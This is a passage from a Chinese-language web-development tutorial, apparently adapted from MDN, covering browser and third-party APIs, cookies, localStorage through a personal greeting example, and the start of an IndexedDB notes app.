href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API">Fetch API</a>。您也可能会遇到描述这种技术的术语<strong>Ajax</strong>。您可以在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Fetching_data">Fetching data from the server</a>找到关于类似的 API 的更多信息。</li><li><strong>用于绘制和操作图形的 API</strong>目前已被浏览器广泛支持 — 最流行的是允许您以编程方式更新包含在 HTML <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/canvas"><code>canvas</code></a> 元素中的像素数据以创建 2D 和 3D 场景的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API">Canvas</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebGL_API">WebGL</a>。例如，您可以绘制矩形或圆形等形状，将图像导入到画布上，然后使用 Canvas API 对其应用滤镜（如棕褐色滤镜或灰度滤镜），或使用 WebGL 创建具有光照和纹理的复杂 3D 场景。这些 API 经常与用于创建动画循环的 API（例如<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/window/requestAnimationFrame"><code>window.requestAnimationFrame()</code></a>）和其他 API 一起不断更新诸如动画和游戏之类的场景。</li><li><strong>音频和视频 API</strong> 例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLMediaElement"><code>HTMLMediaElement</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API">Web Audio API</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API">WebRTC</a> 允许你使用多媒体来做一些非常有趣的事情，比如创建用于播放音频和视频的自定义 UI 控件，显示字幕字幕和你的视频，从网络摄像机抓取视频，通过画布操纵（见上），或在网络会议中显示在别人的电脑上，或者添加效果到音轨（如增益、失真、平移等） 。</li><li><strong>设备 API</strong>基本上是以对网络应用程序有用的方式操作和检索现代设备硬件中的数据的 API。我们已经讨论过访问设备位置数据的地理定位 API，因此您可以在地图上标注您的位置。其他示例还包括通过系统通知（参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Notifications_API">Notifications API</a>）或振动硬件（参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Vibration_API">Vibration API</a>）告诉用户 Web 应用程序有用的更新可用。</li><li><strong>客户端存储 API</strong>在 Web 浏览器中的使用变得越来越普遍 - 如果您想创建一个应用程序来保存页面加载之间的状态，甚至让设备在处于脱机状态时可用，那么在客户端存储数据将会是非常有用的。例如使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API">Web Storage API</a>的简单的键 - 值存储以及使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB API</a>的更复杂的表格数据存储。</li></ul><h4 id="x3D-x3D-常见第三方-API-x3D-x3D"><a href="#x3D-x3D-常见第三方-API-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;常见第三方 API&#x3D;&#x3D;"></a>&#x3D;&#x3D;常见第三方 API&#x3D;&#x3D;</h4><p>第三方 API 种类繁多; 下列是一些比较流行的你可能迟早会用到的第三方 API:</p><ul><li>The <a href="https://dev.twitter.com/overview/documentation">Twitter API</a>, 允许您在您的网站上展示您最近的推文等。</li><li>The <a href="https://developers.google.com/maps/">Google Maps API</a> 允许你在网页上对地图进行很多操作（这很有趣，它也是 Google 地图的驱动器）。现在它是一整套完整的，能够胜任广泛任务的 API。其能力已经被<a href="https://developers.google.com/maps/documentation/api-picker">Google Maps API Picker</a>见证。</li><li>The <a href="https://developers.facebook.com/docs/">Facebook suite of API</a> 允许你将很多 Facebook 生态系统中的功能应用到你的 app，使之受益，比如说它提供了通过 Facebook 账户登录、接受应用内支付、推送有针对性的广告活动等功能。</li><li>The <a href="https://developers.google.com/youtube/">YouTube API</a>, 允许你将 Youtube 上的视频嵌入到网站中去，同时提供搜索 Youtube，创建播放列表等众多功能。</li><li>The <a href="https://www.twilio.com/">Twilio API</a>, 其为您的 app 提供了针对语音通话和视频聊天的框架，以及从您的 app 发送短信息或多媒体信息等诸多功能。</li></ul><p><strong>备注：</strong> 你可以在 <a href="http://www.programmableweb.com/category/all/apis">Programmable Web API directory</a>.上发现更多关于第三方 API 的信息。</p><h3 id="3-10-客户端存储"><a href="#3-10-客户端存储" class="headerlink" title="3.10 客户端存储"></a>3.10 客户端存储</h3><p>在其他的 MDN 学习中我们已经讨论过 静态网站（<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/First_steps/Client-Server_overview#static_sites">static sites</a>）和动态网站（ <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/First_steps/Client-Server_overview#dynamic_sites">dynamic sites</a>）的区别。大多数现代的 web 站点是动态的— 它们在服务端使用各种类型的数据库来存储数据 (服务端存储), 之后通过运行服务端（ <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side">server-side</a>）代码来重新获取需要的数据，把其数据插入到静态页面的模板中，并且生成出 HTML 渲染到用户浏览上。</p><p>客户端存储以相同的原理工作，但是在使用上有一些不同。它是由 JavaScript APIs 组成的因此允许你在客户端存储数据 (比如在用户的机器上)，而且可以在需要的时候重新取得需要的数据。这有很多明显的用处，比如：</p><ul><li>个性化网站偏好（比如显示一个用户选择的窗口小部件，颜色主题，或者字体）。</li><li>保存之前的站点行为 (比如从先前的 session 中获取购物车中的内容，记住用户是否之前已经登陆过)。</li><li>本地化保存数据和静态资源可以使一个站点更快（至少让资源变少）的下载，甚至可以在网络失去链接的时候变得暂时可用。</li><li>保存 web 已经生产的文档可以在离线状态下访问。</li></ul><p>通常客户端和服务端存储是结合在一起使用的。例如，你可以从数据库中下载一个由网络游戏或音乐播放器应用程序使用的音乐文件，将它们存储在客户端数据库中，并按需要播放它们。用户只需下载音乐文件一次——在随后的访问中，它们将从数据库中检索。</p><p><strong>备注：</strong> 使用客户端存储 API 可以存储的数据量是有限的（可能是每个 API 单独的和累积的总量）;具体的数量限制取决于浏览器，也可能基于用户设置。有关更多信息，获取更多信息，请参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API/Browser_storage_limits_and_eviction_criteria">浏览器存储限制和清理标准</a>。</p><p>传统方法：cookies</p><p>客户端存储的概念已经存在很长一段时间了。从早期的网络时代开始，网站就使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">cookies</a> 来存储信息，以在网站上提供个性化的用户体验。它们是网络上最早最常用的客户端存储形式。 因为在那个年代，有许多问题——无论是从技术上的还是用户体验的角度——都是困扰着 cookies 的问题。这些问题非常重要，以至于当第一次访问一个网站时，欧洲居民会收到消息，告诉他们是否会使用 cookies 来存储关于他们的数据，而这是由一项被称为<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E6%AC%A7%E7%9B%9Fcookie%E6%8C%87%E4%BB%A4">欧盟 Cookie 条例</a>的欧盟法律导致的。</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage/cookies-notice.png" alt="img"></p><p>由于这些原因，我们不会在本文中教你如何使用 cookie。毕竟它过时、存在各种<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E5%AE%89%E5%85%A8">安全问题</a>，而且无法存储复杂数据，而且有更好的、更现代的方法可以在用户的计算机上存储种类更广泛的数据。 cookie 的唯一优势是它们得到了非常旧的浏览器的支持，所以如果您的项目需要支持已经过时的浏览器（比如 Internet Explorer 8 或更早的浏览器），cookie 可能仍然有用，但是对于大多数项目（很明显不包括本站）来说，您不需要再使用它们了。其实 cookie 也没什么好说的，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie"><code>document.cookie</code></a>一把梭就完事了。</p><p><strong>备注：</strong> 为什么仍然有新创建的站点使用 cookies？这主要是因为开发人员的习惯，使用了仍然使用 cookies 的旧库，以及存在许多 web 站点，提供了过时的参考和培训材料来学习如何存储数据。</p><p>新流派：Web Storage 和 IndexedDB</p><p>现代浏览器有比使用 cookies 更简单、更有效的存储客户端数据的 API。</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API">Web Storage API</a> 提供了一种非常简单的语法，用于存储和检索较小的、由名称和相应值组成的数据项。当您只需要存储一些简单的数据时，比如用户的名字，用户是否登录，屏幕背景使用了什么颜色等等，这是非常有用的。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB API</a> 为浏览器提供了一个完整的数据库系统来存储复杂的数据。这可以用于存储从完整的用户记录到甚至是复杂的数据类型，如音频或视频文件。</li></ul><p>您将在下面了解更多关于这些 API 的信息。</p><h4 id="未来：Cache-API"><a href="#未来：Cache-API" class="headerlink" title="未来：Cache API"></a>未来：Cache API</h4><p>一些现代浏览器支持新的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Cache"><code>Cache</code></a> API。这个 API 是为存储特定 HTTP 请求的响应文件而设计的，它对于像存储离线网站文件这样的事情非常有用，这样网站就可以在没有网络连接的情况下使用。缓存通常与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API">Service Worker API</a> 组合使用，尽管不一定非要这么做。 Cache 和 Service Workers 的使用是一个高级主题，我们不会在本文中详细讨论它，尽管我们将在下面的 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage#%E7%A6%BB%E7%BA%BF%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8">离线文件存储</a> 一节中展示一个简单的例子。</p><h4 id="存储简单数据"><a href="#存储简单数据" class="headerlink" title="存储简单数据"></a>存储简单数据</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API">Web Storage API</a> 非常容易使用 — 你只需存储简单的 键名&#x2F;键值 对数据 (限制为字符串、数字等类型) 并在需要的时候检索其值。</p><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><p>让我们来告诉你怎么做：</p><ol><li><p>第一步，访问 GitHub 上的 <a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/web-storage/index.html">web storage blank template</a> (在新标签页打开此<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/web-storage/index.html">模板</a>)。</p></li><li><p>打开你浏览器开发者工具的 JavaScript 控制台。</p></li><li><p>你所有的 web storage 数据都包含在浏览器内两个类似于对象的结构中： <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage"><code>sessionStorage</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>localStorage</code></a>。第一种方法，只要浏览器开着，数据就会一直保存 (关闭浏览器时数据会丢失) ，而第二种会一直保存数据，甚至到浏览器关闭又开启后也是这样。我们将在本文中使用第二种方法，因为它通常更有用。</p></li><li><p><code>Storage.setItem()</code>方法允许您在存储中保存一个数据项——它接受两个参数：数据项的名字及其值。试着把它输入到你的 JavaScript 控制台（如果你愿意的话，可以把它的值改为你自己的名字！）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;Chris&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p><code>Storage.getItem()</code>方法接受一个参数——你想要检索的数据项的名称——并返回数据项的值。现在将这些代码输入到你的 JavaScript 控制台：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> myName = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br>myName<br></code></pre></td></tr></table></figure><p>在输入第二行时，您应该会看到myName变量现在包含name数据项的值。</p></li><li><p><code>Storage.removeItem()</code>方法接受一个参数——你想要删除的数据项的名称——并从 web storage 中删除该数据项。在您的 JavaScript 控制台中输入以下几行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">var</span> myName = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br>myName<br></code></pre></td></tr></table></figure><p>第三行现在应该返回null—name项已经不存在于 web storage 中。</p></li></ol><h4 id="数据会一直存在！"><a href="#数据会一直存在！" class="headerlink" title="数据会一直存在！"></a>数据会一直存在！</h4><p>web storage 的一个关键特性是，数据在不同页面加载时都存在（甚至是当浏览器关闭后，对 localStorage 的而言）。让我们来看看这个：</p><ol><li><p>再次打开我们的 Web Storage 空白模板，但是这次你要在不同的浏览器中打开这个教程！这样可以更容易处理。</p></li><li><p>在浏览器的 JavaScript 控制台中输入这几行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;Chris&#x27;</span>);<br><span class="hljs-keyword">var</span> myName = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br>myName<br></code></pre></td></tr></table></figure><p>你应该看到 name 数据项返回。</p></li><li><p>现在关掉浏览器再把它打开。</p></li><li><p>再次输入下面几行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> myName = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br>myName<br></code></pre></td></tr></table></figure><p>你应该看到，尽管浏览器已经关闭，然后再次打开，但仍然可以使用该值。</p></li></ol><h4 id="为每个域名分离储存"><a href="#为每个域名分离储存" class="headerlink" title="为每个域名分离储存"></a>为每个域名分离储存</h4><p>每个域都有一个单独的数据存储区 (每个单独的网址都在浏览器中加载). 你 会看到，如果你加载两个网站（例如 google.com 和 amazon.com）并尝试将某个项目存储在一个网站上，该数据项将无法从另一个网站获取。</p><p>这是有道理的 - 你可以想象如果网站能够查看彼此的数据，就会出现安全问题！</p><h4 id="更复杂的例子"><a href="#更复杂的例子" class="headerlink" title="更复杂的例子"></a>更复杂的例子</h4><p>让我们通过编写一个简单的工作示例来应用这些新发现的知识，让你了解如何使用网络存储。我们的示例将允许你输入一个名称，然后该页面将刷新，以提供个性化问候。这种状态也会页面&#x2F;浏览器重新加载期间保持，因为这个名称存储在 Web Storage 中。</p><p>你可以在 <a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/web-storage/personal-greeting.html">personal-greeting.html</a> 中找到示例文件 —— 这包含一个具有标题，内容和页脚，以及用于输入您的姓名的表单的简单网站。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage/web-storage-demo.png" alt="img"></p><p>让我们来构建示例，以便了解它的工作原理。</p><ol><li><p>首先，在您的计算机上的新目录中创建一个 <a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/web-storage/personal-greeting.html">personal-greeting.html</a> 文件的副本。</p></li><li><p>接下来，请注意我们的 HTML 如何引用一个名为<code>index.js</code>的 JavaScript 文件（请参见第 40 行）。我们需要创建它并将 JavaScript 代码写入其中。在与 HTML 文件相同的目录中创建一个<code>index.js</code>文件。</p></li><li><p>我们首先创建对所有需要在此示例中操作的 HTML 功能的引用 - 我们将它们全部创建为常量，因为这些引用在应用程序的生命周期中不需要更改。将以下几行添加到你的 JavaScript 文件中：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 创建所需的常量</span><br><span class="hljs-keyword">const</span> rememberDiv = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;.remember&#x27;</span>);<br><span class="hljs-keyword">const</span> forgetDiv = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;.forget&#x27;</span>);<br><span class="hljs-keyword">const</span> form = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br><span class="hljs-keyword">const</span> nameInput = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#entername&#x27;</span>);<br><span class="hljs-keyword">const</span> submitBtn = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#submitname&#x27;</span>);<br><span class="hljs-keyword">const</span> forgetBtn = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#forgetname&#x27;</span>);<br><br><span class="hljs-keyword">const</span> h1 = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);<br><span class="hljs-keyword">const</span> personalGreeting = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;.personal-greeting&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>接下来，我们需要包含一个小小的事件监听器，以在按下提交按钮时阻止实际的提交表单动作自身，因为这不是我们想要的行为。在您之前的代码下添加此代码段：在你之前的代码后添加这段代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 当按钮按下时阻止表单提交</span><br>form.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">submit</span>&#x27;, <span class="hljs-params">function</span>(<span class="hljs-params">e</span>)</span> &#123;<br>  e.prevent<span class="hljs-constructor">Default()</span>;<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p>现在我们需要添加一个事件监听器，当单击“Say hello”按钮时，它的处理函数将会运行。这些注释详细解释了每一处都做了什么，但实际上我们在这里获取用户输入到文本输入框中的名字并使用setItem()将它保存在网络存储中，然后运行一个名为nameDisplayCheck()的函数来处理实际的网站文本的更新。将此添加到代码的底部：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// run function when the &#x27;Say hello&#x27; button is clicked</span><br>submitBtn.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">function</span>()</span> &#123;<br>  <span class="hljs-comment">// store the entered name in web storage</span><br>  localStorage.set<span class="hljs-constructor">Item(&#x27;<span class="hljs-params">name</span>&#x27;, <span class="hljs-params">nameInput</span>.<span class="hljs-params">value</span>)</span>;<br>  <span class="hljs-comment">// run nameDisplayCheck() to sort out displaying the</span><br>  <span class="hljs-comment">// personalized greetings and updating the form display</span><br>  name<span class="hljs-constructor">DisplayCheck()</span>;<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p>此时，我们还需要一个事件处理程序，以便在单击“Forget”按钮时运行一个函数——且仅在单击“Say hello”按钮（两种表单状态来回切换）后才显示。在这个功能中，我们使用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-comment">removeItem()</span><br></code></pre></td></tr></table></figure><p>从网络存储中删除项目</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">name</span><br></code></pre></td></tr></table></figure><p>，然后再次运行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nameDisplayCheck</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>以更新显示。将其添加到底部：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// run function when the &#x27;Forget&#x27; button is clicked</span><br>forgetBtn.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">function</span>()</span> &#123;<br>  <span class="hljs-comment">// Remove the stored name from web storage</span><br>  localStorage.remove<span class="hljs-constructor">Item(&#x27;<span class="hljs-params">name</span>&#x27;)</span>;<br>  <span class="hljs-comment">// run nameDisplayCheck() to sort out displaying the</span><br>  <span class="hljs-comment">// generic greeting again and updating the form display</span><br>  name<span class="hljs-constructor">DisplayCheck()</span>;<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p>现在是时候定义</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nameDisplayCheck</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>函数本身了。在这里，我们通过使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><p>作为测试条件来检查 name 数据项是否已经存储在 Web Storage 中。如果它已被存储，则该调用的返回值为true; 如果没有，它会是false。如果是true，我们会显示个性化问候语，显示表格的“forget”部分，并隐藏表格的“Say hello”部分。如果是false，我们会显示一个通用问候语，并做相反的事。再次将下面的代码添到底部：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> define the nameDisplayCheck() <span class="hljs-keyword">function</span><br><span class="hljs-keyword">function</span> nameDisplayCheck() &#123;<br>  <span class="hljs-regexp">//</span> check whether the <span class="hljs-string">&#x27;name&#x27;</span> data item is stored <span class="hljs-keyword">in</span> web Storage<br>  <span class="hljs-keyword">if</span>(localStorage.getItem(<span class="hljs-string">&#x27;name&#x27;</span>)) &#123;<br>    <span class="hljs-regexp">//</span> If it is, display personalized greeting<br>    let name = localStorage.getItem(<span class="hljs-string">&#x27;name&#x27;</span>);<br>    h1.textContent = <span class="hljs-string">&#x27;Welcome, &#x27;</span> + name;<br>    personalGreeting.textContent = <span class="hljs-string">&#x27;Welcome to our website, &#x27;</span> + name + <span class="hljs-string">&#x27;! We hope you have fun while you are here.&#x27;</span>;<br>    <span class="hljs-regexp">//</span> hide the <span class="hljs-string">&#x27;remember&#x27;</span> part of the form and show the <span class="hljs-string">&#x27;forget&#x27;</span> part<br>    forgetDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>    rememberDiv.style.display = <span class="hljs-string">&#x27;none&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">if</span> not, display generic greeting<br>    h1.textContent = <span class="hljs-string">&#x27;Welcome to our website &#x27;</span>;<br>    personalGreeting.textContent = <span class="hljs-string">&#x27;Welcome to our website. We hope you have fun while you are here.&#x27;</span>;<br>    <span class="hljs-regexp">//</span> hide the <span class="hljs-string">&#x27;forget&#x27;</span> part of the form and show the <span class="hljs-string">&#x27;remember&#x27;</span> part<br>    forgetDiv.style.display = <span class="hljs-string">&#x27;none&#x27;</span>;<br>    rememberDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>最后但同样重要的是，我们需要在每次加载页面时运行nameDisplayCheck()函数。如果我们不这样做，那么个性化问候不会在页面重新加载后保持。将以下代码添加到代码的底部：document.body.onload &#x3D; nameDisplayCheck;</p></li></ol><p>你的例子完成了 - 做得好！现在剩下的就是保存你的代码并在浏览器中测试你的 HTML 页面。你可以在这里看到我们的<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/web-storage/personal-greeting.html">完成版本并在线运行</a>。</p><p><strong>备注：</strong> 在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">Using the Web Storage API</a> 中还有一个稍微复杂点儿的示例。</p><p><strong>备注：</strong> 在完成版本的源代码中， <code>&lt;script src=&quot;index.js&quot; defer&gt;&lt;/script&gt;</code> 一行里， <code>defer</code> 属性指明在页面加载完成之前，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script">&#96;&#96;</a>元素的内容不会执行。</p><h4 id="存储复杂数据"><a href="#存储复杂数据" class="headerlink" title="存储复杂数据"></a>存储复杂数据</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB API</a>（有时简称 IDB）是可以在浏览器中访问的一个完整的数据库系统，在这里，你可以存储复杂的关系数据。其种类不限于像字符串和数字这样的简单值。你可以在一个 IndexedDB 中存储视频，图像和许多其他的内容。</p><p>但是，这确实是有代价的：使用 IndexedDB 要比 Web Storage API 复杂得多。在本节中，我们仅仅只能浅尝辄止地一提它的能力，不过我们会给你足够基础知识以帮助你开始。</p><h4 id="通过一个笔记存储示例演示"><a href="#通过一个笔记存储示例演示" class="headerlink" title="通过一个笔记存储示例演示"></a>通过一个笔记存储示例演示</h4><p>在这里，我们将向您介绍一个示例，该示例允许您在浏览器中存储笔记并随时查看和删除它们，在我们进行时，我们将解释 IDB 的最基本部分并让您自己构建注释。</p><p>这个应用看起来像这样：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage/idb-demo.png" alt="img"></p><p>每个笔记都有一个标题和一些正文，每个都可以单独编辑。我们将在下面通过的 JavaScript 代码提供详细的注释，以帮助您了解正在发生的事情。</p><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>1、首先，将 <a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/indexeddb/notes/index.html"><code>index.html</code></a>, <a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/indexeddb/notes/style.css"><code>style.css</code></a>, 和 <a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/indexeddb/notes/index-start.js"><code>index-start.js</code></a> 文件的本地副本放入本地计算机上的新目录中。</p><p>2、浏览这些文件。您将看到 HTML 非常简单：具有页眉和页脚的网站，以及包含显示注释的位置的主内容区域，以及用于在数据库中输入新注释的表单。CSS 提供了一些简单的样式，使其更清晰。JavaScript 文件包含五个声明的常量，其中包含对将显示注释的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 元素的引用，标题和正文 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input">&#96;&#96;</a> 元素，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form">&#96;&#96;</a>本身，以及<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/button">&#96;&#96;</a>。</p><p>3、将您的 JavaScript 文件重命名为 <code>index.js</code> 。您现在可以开始向其添加代码了。</p><h4 id="数据库初始设置"><a href="#数据库初始设置" class="headerlink" title="数据库初始设置"></a>数据库初始设置</h4><p>现在让我们来看看为了建立数据库必须首先要做什么。</p><ol><li><p>在常量声明下，加入这几行：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">// Create an<span class="hljs-built_in"> instance </span>of a db object for us to store the open database in<br>let db;<br></code></pre></td></tr></table></figure><p>这里我们声明了一个叫db的变量 — 这将在之后被用来存储一个代表数据库的对象。我们将在几个地方使用它，所以我们为了方便使用而在这里把它声明为全局的。</p></li><li><p>接着，在你的代码最后添加如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>&#125;;<br></code></pre></td></tr></table></figure><p>我们将把所有的后续代码写在这个window.onload事件处理函数内，这个函数将在 window 的<code>load</code>事件被触发时调用，为了确保我们没有在应用完整加载前试图使用 IndexedDB 